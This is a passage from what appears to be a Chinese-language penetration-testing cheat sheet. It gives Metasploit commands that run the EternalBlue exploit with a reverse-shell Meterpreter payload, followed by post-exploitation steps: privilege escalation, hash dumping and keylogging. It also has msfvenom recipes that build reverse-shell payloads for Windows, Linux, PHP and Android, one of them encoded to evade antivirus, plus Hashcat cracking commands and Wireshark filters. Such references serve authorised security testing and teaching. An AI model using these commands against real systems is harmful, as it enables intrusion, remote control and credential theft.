### 3.2 Metasploit常用命令

```bash
# 启动
msfconsole

# 搜索模块
search type:exploit platform:windows cve:2023

# 使用模块
use exploit/windows/smb/ms17_010_eternalblue

# 设置参数
set RHOSTS 192.168.1.100
set LHOST 192.168.1.1
set PAYLOAD windows/meterpreter/reverse_tcp

# 运行
exploit

# Meterpreter常用命令
sysinfo          # 系统信息
getuid           # 当前用户
getsystem        # 提权
hashdump         # 导出哈希
screenshot       # 截屏
keyscan_start    # 键盘记录开始
portfwd          # 端口转发
shell            # 获取shell
background       # 后台会话
```

### 3.3 载荷生成

```bash
# msfvenom载荷生成
# Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=443 -f exe > https.exe

# Linux
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf > shell.elf

# Web
msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw > shell.php

# Android
msfvenom -p android/meterpreter/reverse_tcp LHOST=IP LPORT=4444 > shell.apk

# 编码免杀（效果有限）
msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 3 -f exe > encoded.exe
```

```bash
# Hashcat常见用法
# MD5
hashcat -m 0 -a 0 hash.txt rockyou.txt

# SHA-256
hashcat -m 1400 -a 0 hash.txt rockyou.txt

# bcrypt
hashcat -m 3200 -a 0 hash.txt rockyou.txt

# NTLM
hashcat -m 1000 -a 0 hash.txt rockyou.txt

# 掩码攻击（8位数字密码）
hashcat -m 0 -a 3 hash.txt ?d?d?d?d?d?d?d?d

# 规则攻击
hashcat -m 0 -a 0 hash.txt rockyou.txt -r rules/best64.rule
```

### 5.3 Wireshark常用过滤器

```
# IP过滤
ip.addr == 192.168.1.1
ip.src == 10.0.0.1 && ip.dst == 10.0.0.2

# 端口过滤
tcp.port == 80
udp.port == 53

# 协议过滤
http
dns
tls
tcp

# HTTP过滤
http.request.method == "POST"
http.response.code == 200
http contains "password"

# DNS过滤
dns.qry.name contains "evil"
dns.flags.rcode != 0

# 特征过滤
tcp.flags.syn == 1 && tcp.flags.ack == 0  # SYN包
tcp.analysis.retransmission  # 重传包
frame contains "password"  # 载荷包含password
```
